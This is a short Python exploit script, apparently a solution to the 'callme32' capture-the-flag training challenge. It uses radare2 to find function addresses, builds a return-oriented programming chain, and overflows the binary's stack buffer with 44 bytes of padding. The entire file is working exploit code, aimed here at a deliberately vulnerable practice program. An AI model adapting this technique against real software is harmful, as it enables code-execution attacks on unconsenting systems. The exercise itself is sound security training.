import r2pipe
from pwn import *

binary = './callme32'
padding = 44

def hex2int(s):
    return int(s[2:], 16)

r2 = r2pipe.open(binary)
r2.cmd('aaaa')

# put content here (define payload)
payload = b''

cont = r2.cmd('f~sym.imp.callme')
addrs = {}
for x in cont.strip().splitlines():
    addrs[x.split()[2].split('.')[2]] = hex2int(x.split()[0])
print(addrs)

pop3 = 0x080488a9
payload += p32(addrs['callme_one'])
payload += p32(pop3)
payload += p32(1)
payload += p32(2)
payload += p32(3)

payload += p32(addrs['callme_two'])
payload += p32(pop3)
payload += p32(1)
payload += p32(2)
payload += p32(3)

payload += p32(addrs['callme_three'])
payload += p32(pop3)
payload += p32(1)
payload += p32(2)
payload += p32(3)
log.hexdump(payload)

# end of content

p = process(binary)
p.sendline(b'a' * padding + payload)
p.wait()
print(p.recvall().decode())
